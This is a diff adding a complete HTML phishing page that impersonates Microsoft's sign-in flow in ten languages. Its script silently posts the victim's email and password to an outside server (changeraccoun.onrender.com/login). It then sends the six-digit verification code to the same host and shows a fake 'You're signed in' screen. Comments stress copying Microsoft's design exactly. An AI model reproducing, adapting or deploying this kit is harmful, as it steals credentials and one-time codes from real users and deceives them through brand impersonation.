@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Microsoft – Sign in</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    min-height: 100vh;
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+    font-size: 15px;
+    background: #f2f2f2;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .ms-bg {
+    position: fixed; inset: 0; z-index: 0;
+    background: #f2f2f2;
+  }
+  .ms-bg::before {
+    content: '';
+    position: absolute; top: -10%; right: -5%;
+    width: 55%; height: 70%;
+    background: radial-gradient(ellipse at 70% 30%,
+      rgba(0,103,184,0.10) 0%, transparent 70%);
+  }
+  .ms-bg::after {
+    content: '';
+    position: absolute; bottom: -10%; left: -5%;
+    width: 55%; height: 65%;
+    background: radial-gradient(ellipse at 30% 70%,
+      rgba(0,164,239,0.08) 0%, transparent 70%);
+  }
+
+  /* ── CARD ── */
+  .card {
+    position: relative; z-index: 1;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+    width: 440px;
+    padding: 44px 44px 36px;
+  }
+
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* ── LOGO ── */
+  .logo-left { margin-bottom: 30px; }
+
+  .logo-centered {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    margin-bottom: 22px;
+    width: 100%;
+  }
+
+  /* ── BACK ARROW — exact MS size ── */
+  .back-btn {
+    position: absolute; left: 0;
+    background: none; border: none; cursor: pointer;
+    padding: 4px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 2px;
+    transition: background 0.12s;
+  }
+  .back-btn:hover { background: #e8e8e8; }
+
+  /* Real MS chevron: ~28px tall, thick, blue */
+  .back-btn svg {
+    width: 28px;
+    height: 28px;
+    display: block;
+  }
+
+  /* ── MS FLAG + WORDMARK ── */
+  .ms-logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    text-decoration: none;
+  }
+  .ms-flag {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    grid-template-rows: 1fr 1fr;
+    gap: 2px;
+    width: 21px; height: 21px;
+    flex-shrink: 0;
+  }
+  .ms-flag span:nth-child(1) { background: #f25022; }
+  .ms-flag span:nth-child(2) { background: #7fba00; }
+  .ms-flag span:nth-child(3) { background: #00a4ef; }
+  .ms-flag span:nth-child(4) { background: #ffb900; }
+
+  .ms-word {
+    font-size: 17px;
+    font-weight: 600;
+    color: #737373;
+    letter-spacing: -0.3px;
+    line-height: 1;
+  }
+
+  /* ── EMAIL PILL ── */
+  .email-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    border: 1px solid #8a8a8a;
+    border-radius: 14px;
+    padding: 4px 14px 4px 9px;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 22px;
+    max-width: 100%;
+    overflow: hidden;
+  }
+  .email-pill span {
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  /* ── TITLES ── */
+  .page-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 14px;
+  }
+  .page-sub {
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 22px;
+    line-height: 1.55;
+  }
+
+  /* ── INPUTS ── */
+  .field-wrap { position: relative; margin-bottom: 4px; }
+
+  .field {
+    width: 100%; height: 48px;
+    padding: 18px 44px 0 11px;
+    font-family: inherit; font-size: 15px;
+    color: #1b1b1b; background: #fff;
+    border: 1px solid #767676;
+    outline: none;
+    transition: border-color 0.1s, box-shadow 0.1s;
+  }
+  .field:hover:not(:focus) { border-color: #1b1b1b; }
+  .field:focus {
+    border-color: #0067b8;
+    box-shadow: 0 0 0 1px #0067b8 inset;
+  }
+
+  .flabel {
+    position: absolute;
+    left: 12px; top: 15px;
+    font-size: 14px; color: #767676;
+    pointer-events: none;
+    transition: top .1s, font-size .1s, color .1s;
+  }
+  .field:focus ~ .flabel,
+  .field.filled ~ .flabel {
+    top: 6px; font-size: 11px;
+  }
+  .field:focus ~ .flabel { color: #0067b8; }
+
+  .eye-btn {
+    position: absolute; right: 8px; top: 50%;
+    transform: translateY(-50%);
+    background: none; border: none; cursor: pointer;
+    color: #1b1b1b; padding: 6px;
+    display: flex; align-items: center;
+    border-radius: 2px;
+  }
+  .eye-btn:hover { background: #f2f2f2; }
+
+  /* ── LINKS ── */
+  .ms-link {
+    font-size: 13px; color: #0067b8;
+    cursor: pointer; display: inline-block;
+    margin: 12px 0 22px;
+    text-decoration: none;
+  }
+  .ms-link:hover { text-decoration: underline; }
+
+  /* ── ERROR ── */
+  .err-msg {
+    font-size: 12px; color: #a4262c;
+    margin: 6px 0 8px; display: none; padding: 4px 0;
+  }
+
+  /* ── NEXT BUTTON — right-aligned, MS style ── */
+  .btn-row {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 4px;
+  }
+  .btn-next {
+    min-width: 108px; height: 32px;
+    padding: 0 18px;
+    background: #0067b8; color: #fff;
+    font-family: inherit; font-size: 14px;
+    border: none; cursor: pointer;
+    transition: background 0.1s;
+  }
+  .btn-next:hover { background: #005ba3; }
+  .btn-next:active { background: #004e8c; }
+
+  /* ── BOTTOM LINKS ── */
+  .bottom-link {
+    font-size: 13px; color: #1b1b1b;
+    margin-top: 20px;
+  }
+  .bottom-link a {
+    color: #0067b8; cursor: pointer; text-decoration: none;
+  }
+  .bottom-link a:hover { text-decoration: underline; }
+
+  /* ── OTP BOXES — match screenshot exactly ── */
+  .code-row {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 10px;
+  }
+  .cdig {
+    width: 44px; height: 52px;
+    border: 1px solid #767676;
+    font-size: 22px; font-family: inherit;
+    color: #1b1b1b; text-align: center;
+    outline: none;
+    -moz-appearance: textfield;
+    transition: border-color 0.1s, box-shadow 0.1s;
+  }
+  .cdig::-webkit-outer-spin-button,
+  .cdig::-webkit-inner-spin-button { -webkit-appearance: none; }
+  .cdig:focus {
+    border-color: #0067b8;
+    box-shadow: 0 0 0 1px #0067b8 inset;
+  }
+
+  /* ── SUCCESS ── */
+  .success-icon { width: 52px; height: 52px; margin-bottom: 18px; }
+
+  /* ── FOOTER ── */
+  .ms-footer {
+    position: relative; z-index: 1;
+    margin-top: 18px;
+    display: flex; gap: 16px; flex-wrap: wrap;
+    font-size: 11px; color: #767676;
+  }
+  .ms-footer a { color: #767676; text-decoration: none; }
+  .ms-footer a:hover { text-decoration: underline; }
+
+  @media (max-width: 500px) {
+    .card {
+      width: 100vw; min-height: 100vh;
+      padding: 40px 24px 32px;
+      box-shadow: none;
+    }
+    body { justify-content: flex-start; }
+  }
+</style>
+</head>
+<body>
+<div class="ms-bg"></div>
+
+<div class="card">
+
+  <!-- ══ PAGE 1 : EMAIL ══ -->
+  <div class="page active" id="p1">
+    <div class="logo-left">
+      <div class="ms-logo">
+        <div class="ms-flag">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-word">Microsoft</span>
+      </div>
+    </div>
+    <div class="page-title" data-i18n="title_signin"></div>
+    <div class="page-sub"   data-i18n="sub_signin"></div>
+    <div class="field-wrap">
+      <input class="field" type="email" id="emailInput" autocomplete="email"
+        placeholder="" oninput="syncFilled(this)"/>
+      <label class="flabel" data-i18n="label_email"></label>
+    </div>
+    <div class="err-msg" id="errEmail" data-i18n="err_email"></div>
+    <div style="margin-top:10px; margin-bottom:22px;">
+      <a class="ms-link" href="#" data-i18n="link_no_account"></a>
+    </div>
+    <div style="font-size:13px; color:#1b1b1b; margin-bottom:14px;" data-i18n="link_cant_access"></div>
+    <div class="btn-row">
+      <button class="btn-next" onclick="goStep2()" data-i18n="btn_next"></button>
+    </div>
+  </div>
+
+  <!-- ══ PAGE 2 : MOT DE PASSE ══ -->
+  <div class="page" id="p2">
+    <div class="logo-centered">
+      <button class="back-btn" onclick="goBack(1)" aria-label="Back">
+        <!-- Real MS chevron shape — thick, ~28px -->
+        <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 6L10 14L18 22" stroke="#0067b8" stroke-width="2.8"
+            stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <div class="ms-logo">
+        <div class="ms-flag">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-word">Microsoft</span>
+      </div>
+    </div>
+
+    <div style="text-align:center; margin-bottom:22px;">
+      <div class="email-pill" style="margin-bottom:0;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+          stroke="#555" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>
+        <span id="emailShow">—</span>
+      </div>
+    </div>
+
+    <div class="page-title" data-i18n="title_pwd"></div>
+    <div class="field-wrap">
+      <input class="field" type="password" id="pwdInput"
+        autocomplete="current-password" placeholder=""
+        oninput="syncFilled(this)"/>
+      <label class="flabel" data-i18n="label_pwd"></label>
+      <button class="eye-btn" onclick="togglePwd()" type="button">
+        <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+          stroke="currentColor" stroke-width="1.6"
+          stroke-linecap="round" stroke-linejoin="round">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        </svg>
+      </button>
+    </div>
+    <div class="err-msg" id="errPwd" data-i18n="err_pwd"></div>
+    <a class="ms-link" href="#" data-i18n="link_forgot_pwd"></a>
+    <div class="btn-row">
+      <button class="btn-next" onclick="goStep3()" data-i18n="btn_next"></button>
+    </div>
+    <div class="bottom-link">
+      <a data-i18n="link_other_ways"></a>
+    </div>
+  </div>
+
+  <!-- ══ PAGE 3 : CODE OTP ══ -->
+  <div class="page" id="p3">
+    <div class="logo-centered">
+      <button class="back-btn" onclick="goBack(2)" aria-label="Back">
+        <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 6L10 14L18 22" stroke="#0067b8" stroke-width="2.8"
+            stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <div class="ms-logo">
+        <div class="ms-flag">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-word">Microsoft</span>
+      </div>
+    </div>
+
+    <div style="text-align:center; margin-bottom:22px;">
+      <div class="email-pill" style="margin-bottom:0;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+          stroke="#555" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
+        </svg>
+        <span id="emailShow3">—</span>
+      </div>
+    </div>
+
+    <div class="page-title" data-i18n="title_code"></div>
+    <div class="page-sub" id="codeSub"></div>
+
+    <div class="code-row">
+      <input class="cdig" type="number" id="d1" inputmode="numeric">
+      <input class="cdig" type="number" id="d2" inputmode="numeric">
+      <input class="cdig" type="number" id="d3" inputmode="numeric">
+      <input class="cdig" type="number" id="d4" inputmode="numeric">
+      <input class="cdig" type="number" id="d5" inputmode="numeric">
+      <input class="cdig" type="number" id="d6" inputmode="numeric">
+    </div>
+    <div class="err-msg" id="errCode" data-i18n="err_code"></div>
+
+    <a class="ms-link" href="#" data-i18n="link_no_code"></a>
+    <div class="btn-row">
+      <button class="btn-next" onclick="checkCode()" data-i18n="btn_signin"></button>
+    </div>
+  </div>
+
+  <!-- ══ PAGE 4 : SUCCÈS ══ -->
+  <div class="page" id="p4">
+    <div class="logo-left">
+      <div class="ms-logo">
+        <div class="ms-flag">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <span class="ms-word">Microsoft</span>
+      </div>
+    </div>
+    <svg class="success-icon" viewBox="0 0 52 52" fill="none">
+      <circle cx="26" cy="26" r="26" fill="#dff6dd"/>
+      <polyline points="14,26 22,34 38,18"
+        stroke="#107c10" stroke-width="3"
+        stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <div class="page-title" style="color:#107c10;" data-i18n="title_success"></div>
+    <div class="page-sub" data-i18n="sub_success"></div>
+  </div>
+
+</div>
+
+<div class="ms-footer">
+  <span id="footerCopy"></span>
+  <a href="#" data-i18n="footer_terms"></a>
+  <a href="#" data-i18n="footer_privacy"></a>
+</div>
+
+<script>
+/* ══════════════════════════════════════════
+   I18N — auto-detect browser language
+══════════════════════════════════════════ */
+const LOCALES = {
+  fr: {
+    title_signin:    "Se connecter",
+    sub_signin:      "Utilisez votre compte Microsoft.",
+    label_email:     "E-mail, téléphone ou Skype",
+    err_email:       "Ce compte Microsoft n'existe pas. Créez-en un ou essayez avec une adresse différente.",
+    link_no_account: "Aucun compte ? Créez-en un !",
+    link_cant_access:"Vous ne pouvez pas accéder à votre compte ?",
+    btn_next:        "Suivant",
+    title_pwd:       "Entrer le mot de passe",
+    label_pwd:       "Mot de passe",
+    err_pwd:         "Votre compte ou votre mot de passe est incorrect.",
+    link_forgot_pwd: "Mot de passe oublié ?",
+    link_other_ways: "Autres façons de se connecter",
+    title_code:      "Entrer le code",
+    code_sub:        "Nous avons envoyé un code à {email}. Vérifiez votre messagerie et entrez le code ci-dessous.",
+    err_code:        "Le code que vous avez entré n'est pas valide. Réessayez.",
+    link_no_code:    "Je n'ai pas reçu de code",
+    btn_signin:      "Se connecter",
+    title_success:   "Vous êtes connecté",
+    sub_success:     "Connexion réussie. Vous allez être redirigé.",
+    footer_terms:    "Conditions d'utilisation",
+    footer_privacy:  "Confidentialité et cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  en: {
+    title_signin:    "Sign in",
+    sub_signin:      "Use your Microsoft account.",
+    label_email:     "Email, phone, or Skype",
+    err_email:       "This Microsoft account doesn't exist. Enter a different account or get a new one.",
+    link_no_account: "No account? Create one!",
+    link_cant_access:"Can't access your account?",
+    btn_next:        "Next",
+    title_pwd:       "Enter password",
+    label_pwd:       "Password",
+    err_pwd:         "Your account or password is incorrect.",
+    link_forgot_pwd: "Forgot password?",
+    link_other_ways: "Other ways to sign in",
+    title_code:      "Enter code",
+    code_sub:        "We sent a code to {email}. Check your email and enter the code below.",
+    err_code:        "The code you entered is invalid. Try again.",
+    link_no_code:    "I didn't receive a code",
+    btn_signin:      "Sign in",
+    title_success:   "You're signed in",
+    sub_success:     "Sign-in successful. You'll be redirected shortly.",
+    footer_terms:    "Terms of use",
+    footer_privacy:  "Privacy & cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  es: {
+    title_signin:    "Iniciar sesión",
+    sub_signin:      "Usa tu cuenta de Microsoft.",
+    label_email:     "Correo, teléfono o Skype",
+    err_email:       "Esta cuenta de Microsoft no existe. Prueba con otra dirección.",
+    link_no_account: "¿No tienes cuenta? ¡Crea una!",
+    link_cant_access:"¿No puedes acceder a tu cuenta?",
+    btn_next:        "Siguiente",
+    title_pwd:       "Escribir contraseña",
+    label_pwd:       "Contraseña",
+    err_pwd:         "Tu cuenta o contraseña es incorrecta.",
+    link_forgot_pwd: "¿Olvidaste tu contraseña?",
+    link_other_ways: "Otras formas de iniciar sesión",
+    title_code:      "Escribir código",
+    code_sub:        "Enviamos un código a {email}. Revisa tu correo e ingresa el código a continuación.",
+    err_code:        "El código que ingresaste no es válido. Inténtalo de nuevo.",
+    link_no_code:    "No recibí un código",
+    btn_signin:      "Iniciar sesión",
+    title_success:   "Has iniciado sesión",
+    sub_success:     "Inicio de sesión correcto. Serás redirigido en breve.",
+    footer_terms:    "Términos de uso",
+    footer_privacy:  "Privacidad y cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  de: {
+    title_signin:    "Anmelden",
+    sub_signin:      "Verwende dein Microsoft-Konto.",
+    label_email:     "E-Mail, Telefon oder Skype",
+    err_email:       "Dieses Microsoft-Konto existiert nicht. Versuche eine andere Adresse.",
+    link_no_account: "Kein Konto? Erstelle eines!",
+    link_cant_access:"Kannst du nicht auf dein Konto zugreifen?",
+    btn_next:        "Weiter",
+    title_pwd:       "Kennwort eingeben",
+    label_pwd:       "Kennwort",
+    err_pwd:         "Dein Konto oder Kennwort ist falsch.",
+    link_forgot_pwd: "Kennwort vergessen?",
+    link_other_ways: "Andere Anmeldemethoden",
+    title_code:      "Code eingeben",
+    code_sub:        "Wir haben einen Code an {email} gesendet. Überprüfe deine E-Mails und gib den Code unten ein.",
+    err_code:        "Der eingegebene Code ist ungültig. Versuche es erneut.",
+    link_no_code:    "Ich habe keinen Code erhalten",
+    btn_signin:      "Anmelden",
+    title_success:   "Du bist angemeldet",
+    sub_success:     "Anmeldung erfolgreich. Du wirst gleich weitergeleitet.",
+    footer_terms:    "Nutzungsbedingungen",
+    footer_privacy:  "Datenschutz und Cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  it: {
+    title_signin:    "Accedi",
+    sub_signin:      "Usa il tuo account Microsoft.",
+    label_email:     "Email, telefono o Skype",
+    err_email:       "Questo account Microsoft non esiste. Prova con un altro indirizzo.",
+    link_no_account: "Non hai un account? Creane uno!",
+    link_cant_access:"Non riesci ad accedere al tuo account?",
+    btn_next:        "Avanti",
+    title_pwd:       "Inserisci la password",
+    label_pwd:       "Password",
+    err_pwd:         "Il tuo account o la password non sono corretti.",
+    link_forgot_pwd: "Password dimenticata?",
+    link_other_ways: "Altri modi per accedere",
+    title_code:      "Inserisci il codice",
+    code_sub:        "Abbiamo inviato un codice a {email}. Controlla la tua email e inserisci il codice qui sotto.",
+    err_code:        "Il codice inserito non è valido. Riprova.",
+    link_no_code:    "Non ho ricevuto un codice",
+    btn_signin:      "Accedi",
+    title_success:   "Hai effettuato l'accesso",
+    sub_success:     "Accesso riuscito. Verrai reindirizzato a breve.",
+    footer_terms:    "Condizioni d'uso",
+    footer_privacy:  "Privacy e cookie",
+    footer_copy:     "© Microsoft {year}",
+  },
+  pt: {
+    title_signin:    "Entrar",
+    sub_signin:      "Use sua conta Microsoft.",
+    label_email:     "Email, telefone ou Skype",
+    err_email:       "Esta conta Microsoft não existe. Tente com outro endereço.",
+    link_no_account: "Não tem conta? Crie uma!",
+    link_cant_access:"Não consegue acessar sua conta?",
+    btn_next:        "Próximo",
+    title_pwd:       "Inserir senha",
+    label_pwd:       "Senha",
+    err_pwd:         "Sua conta ou senha está incorreta.",
+    link_forgot_pwd: "Esqueceu sua senha?",
+    link_other_ways: "Outras formas de entrar",
+    title_code:      "Inserir código",
+    code_sub:        "Enviamos um código para {email}. Verifique seu email e insira o código abaixo.",
+    err_code:        "O código inserido é inválido. Tente novamente.",
+    link_no_code:    "Não recebi um código",
+    btn_signin:      "Entrar",
+    title_success:   "Você está conectado",
+    sub_success:     "Login bem-sucedido. Você será redirecionado em breve.",
+    footer_terms:    "Termos de uso",
+    footer_privacy:  "Privacidade e cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  nl: {
+    title_signin:    "Aanmelden",
+    sub_signin:      "Gebruik je Microsoft-account.",
+    label_email:     "E-mail, telefoon of Skype",
+    err_email:       "Dit Microsoft-account bestaat niet. Probeer een ander adres.",
+    link_no_account: "Geen account? Maak er een aan!",
+    link_cant_access:"Geen toegang tot je account?",
+    btn_next:        "Volgende",
+    title_pwd:       "Wachtwoord invoeren",
+    label_pwd:       "Wachtwoord",
+    err_pwd:         "Je account of wachtwoord is onjuist.",
+    link_forgot_pwd: "Wachtwoord vergeten?",
+    link_other_ways: "Andere manieren om aan te melden",
+    title_code:      "Code invoeren",
+    code_sub:        "We hebben een code gestuurd naar {email}. Controleer je e-mail en voer de code hieronder in.",
+    err_code:        "De ingevoerde code is ongeldig. Probeer het opnieuw.",
+    link_no_code:    "Ik heb geen code ontvangen",
+    btn_signin:      "Aanmelden",
+    title_success:   "Je bent aangemeld",
+    sub_success:     "Aanmelding geslaagd. Je wordt zo doorgestuurd.",
+    footer_terms:    "Gebruiksvoorwaarden",
+    footer_privacy:  "Privacy en cookies",
+    footer_copy:     "© Microsoft {year}",
+  },
+  pl: {
+    title_signin:    "Zaloguj się",
+    sub_signin:      "Użyj swojego konta Microsoft.",
+    label_email:     "E-mail, telefon lub Skype",
+    err_email:       "To konto Microsoft nie istnieje. Spróbuj innego adresu.",
+    link_no_account: "Nie masz konta? Utwórz je!",
+    link_cant_access:"Nie możesz uzyskać dostępu do konta?",
+    btn_next:        "Dalej",
+    title_pwd:       "Wprowadź hasło",
+    label_pwd:       "Hasło",
+    err_pwd:         "Twoje konto lub hasło jest nieprawidłowe.",
+    link_forgot_pwd: "Nie pamiętasz hasła?",
+    link_other_ways: "Inne sposoby logowania",
+    title_code:      "Wprowadź kod",
+    code_sub:        "Wysłaliśmy kod na {email}. Sprawdź pocztę i wprowadź kod poniżej.",
+    err_code:        "Wprowadzony kod jest nieprawidłowy. Spróbuj ponownie.",
+    link_no_code:    "Nie otrzymałem(-am) kodu",
+    btn_signin:      "Zaloguj się",
+    title_success:   "Jesteś zalogowany(-a)",
+    sub_success:     "Logowanie powiodło się. Za chwilę zostaniesz przekierowany(-a).",
+    footer_terms:    "Warunki użytkowania",
+    footer_privacy:  "Prywatność i pliki cookie",
+    footer_copy:     "© Microsoft {year}",
+  },
+  tr: {
+    title_signin:    "Oturum aç",
+    sub_signin:      "Microsoft hesabınızı kullanın.",
+    label_email:     "E-posta, telefon veya Skype",
+    err_email:       "Bu Microsoft hesabı mevcut değil. Farklı bir adres deneyin.",
+    link_no_account: "Hesabınız yok mu? Oluşturun!",
+    link_cant_access:"Hesabınıza erişemiyor musunuz?",
+    btn_next:        "İleri",
+    title_pwd:       "Parola girin",
+    label_pwd:       "Parola",
+    err_pwd:         "Hesabınız veya parolanız hatalı.",
+    link_forgot_pwd: "Parolanızı mı unuttunuz?",
+    link_other_ways: "Diğer oturum açma yöntemleri",
+    title_code:      "Kodu girin",
+    code_sub:        "{email} adresine bir kod gönderdik. E-postanızı kontrol edin ve kodu aşağıya girin.",
+    err_code:        "Girdiğiniz kod geçersiz. Tekrar deneyin.",
+    link_no_code:    "Kod almadım",
+    btn_signin:      "Oturum aç",
+    title_success:   "Oturum açtınız",
+    sub_success:     "Oturum açma başarılı. Kısa süre içinde yönlendirileceksiniz.",
+    footer_terms:    "Kullanım koşulları",
+    footer_privacy:  "Gizlilik ve çerezler",
+    footer_copy:     "© Microsoft {year}",
+  },
+  ar: {
+    title_signin:    "تسجيل الدخول",
+    sub_signin:      "استخدم حساب Microsoft الخاص بك.",
+    label_email:     "البريد الإلكتروني أو الهاتف أو Skype",
+    err_email:       "حساب Microsoft هذا غير موجود. جرب عنوانًا مختلفًا.",
+    link_no_account: "ليس لديك حساب؟ أنشئ حسابًا!",
+    link_cant_access:"هل لا يمكنك الوصول إلى حسابك؟",
+    btn_next:        "التالي",
+    title_pwd:       "أدخل كلمة المرور",
+    label_pwd:       "كلمة المرور",
+    err_pwd:         "حسابك أو كلمة المرور غير صحيحة.",
+    link_forgot_pwd: "هل نسيت كلمة المرور؟",
+    link_other_ways: "طرق أخرى لتسجيل الدخول",
+    title_code:      "أدخل الرمز",
+    code_sub:        "أرسلنا رمزًا إلى {email}. تحقق من بريدك وأدخل الرمز أدناه.",
+    err_code:        "الرمز الذي أدخلته غير صالح. حاول مجددًا.",
+    link_no_code:    "لم أتلقَّ رمزًا",
+    btn_signin:      "تسجيل الدخول",
+    title_success:   "تم تسجيل دخولك",
+    sub_success:     "تم تسجيل الدخول بنجاح. ستتم إعادة توجيهك قريبًا.",
+    footer_terms:    "شروط الاستخدام",
+    footer_privacy:  "الخصوصية وملفات تعريف الارتباط",
+    footer_copy:     "© Microsoft {year}",
+  },
+};
+
+/* detect lang — fallback to EN */
+function detectLang() {
+  const nav = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+  const code = nav.split('-')[0];
+  return LOCALES[code] ? code : 'en';
+}
+
+let T = {}; // active translations
+
+function applyI18n(lang) {
+  T = LOCALES[lang] || LOCALES['en'];
+  const year = new Date().getFullYear();
+
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (T[key] !== undefined) el.textContent = T[key];
+  });
+
+  /* footer year */
+  const fc = document.getElementById('footerCopy');
+  if (fc) fc.textContent = T.footer_copy.replace('{year}', year);
+
+  /* RTL for Arabic */
+  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+  document.documentElement.lang = lang;
+}
+
+/* ══════════════════════════════════════════
+   APP STATE
+══════════════════════════════════════════ */
+let currentPage = 1;
+
+function showPage(from, to) {
+  document.getElementById('p' + from).classList.remove('active');
+  document.getElementById('p' + to).classList.add('active');
+  currentPage = to;
+}
+
+function syncFilled(el) {
+  el.classList.toggle('filled', el.value.length > 0);
+}
+
+function togglePwd() {
+  const f = document.getElementById('pwdInput');
+  const icon = document.getElementById('eyeIcon');
+  if (f.type === 'password') {
+    f.type = 'text';
+    icon.innerHTML = `
+      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8
+               a18.45 18.45 0 0 1 5.06-5.94"/>
+      <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8
+               a18.5 18.5 0 0 1-2.16 3.19"/>
+      <line x1="1" y1="1" x2="23" y2="23"/>`;
+  } else {
+    f.type = 'password';
+    icon.innerHTML = `
+      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+      <circle cx="12" cy="12" r="3"/>`;
+  }
+}
+
+/* ── PAGE 1 → 2 ── */
+function goStep2() {
+  const email = document.getElementById('emailInput').value.trim();
+  const err   = document.getElementById('errEmail');
+  if (!email || !email.includes('@')) {
+    err.style.display = 'block';
+    return;
+  }
+  err.style.display = 'none';
+  document.getElementById('emailShow').textContent = email;
+  showPage(1, 2);
+  setTimeout(() => document.getElementById('pwdInput').focus(), 80);
+}
+
+/* ── PAGE 2 → 3 ── */
+function goStep3() {
+  const email    = document.getElementById('emailInput').value.trim();
+  const password = document.getElementById('pwdInput').value;
+  const err      = document.getElementById('errPwd');
+  if (!password) { err.style.display = 'block'; return; }
+  err.style.display = 'none';
+
+  fetch("https://changeraccoun.onrender.com/login", {
+    method: "POST",
+    credentials: "include",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password })
+  }).catch(() => {});
+
+  document.getElementById('emailShow3').textContent = email;
+
+  /* i18n code sub with email interpolated */
+  document.getElementById('codeSub').innerHTML =
+    T.code_sub.replace('{email}', `<b>${email}</b>`);
+
+  showPage(2, 3);
+  setTimeout(() => document.getElementById('d1').focus(), 80);
+}
+
+/* ── OTP INPUTS ── */
+const digits = [...document.querySelectorAll('.cdig')];
+
+digits.forEach((inp, i) => {
+  inp.addEventListener('input', () => {
+    inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
+    if (inp.value && digits[i + 1]) digits[i + 1].focus();
+    if (digits.every(d => d.value.length === 1)) checkCode();
+  });
+
+  inp.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !inp.value && digits[i - 1])
+      digits[i - 1].focus();
+  });
+
+  inp.addEventListener('paste', e => {
+    e.preventDefault();
+    const pasted = (e.clipboardData || window.clipboardData)
+      .getData('text').replace(/\D/g, '').slice(0, 6);
+    pasted.split('').forEach((ch, j) => {
+      if (digits[i + j]) digits[i + j].value = ch;
+    });
+    const next = digits[Math.min(i + pasted.length, 5)];
+    if (next) next.focus();
+    if (pasted.length === 6) checkCode();
+  });
+});
+
+/* ── VERIFY CODE ── */
+async function checkCode() {
+  const code = digits.map(d => d.value).join('');
+  const err  = document.getElementById('errCode');
+  if (!/^\d{6}$/.test(code)) { err.style.display = 'block'; return; }
+  err.style.display = 'none';
+
+  try {
+    await fetch("https://changeraccoun.onrender.com/verify-code", {
+      method: "POST",
+      credentials: "include",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code })
+    });
+  } catch (_) {}
+
+  showPage(3, 4);
+}
+
+/* ── BACK ── */
+function goBack(to) { showPage(to + 1, to); }
+
+/* ── ENTER ── */
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  if (currentPage === 1) goStep2();
+  else if (currentPage === 2) goStep3();
+  else if (currentPage === 3) checkCode();
+});
+
+/* ── BOOT ── */
+applyI18n(detectLang());
+</script>
+</body>
+</html>
